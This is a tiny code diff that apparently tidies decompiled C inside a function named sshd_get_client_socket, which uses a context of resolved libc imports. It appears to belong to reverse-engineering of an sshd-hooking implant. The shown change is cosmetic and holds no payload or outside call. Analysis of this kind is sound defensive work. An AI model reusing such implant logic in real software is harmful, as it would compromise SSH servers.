@@ -44,7 +44,7 @@ BOOL sshd_get_client_socket
         }
         fd = addr->m_sendfd;
       }
-      client_fd._0_1_ = 0;
+      *(u8 *)&client_fd = 0;
       plVar4 = ctx->libc_imports;
       if (((-1 < fd) && (plVar4 != (libc_imports_t *)0x0)) &&
          ((plVar4->read != (pfn_read_t)0x0 &&
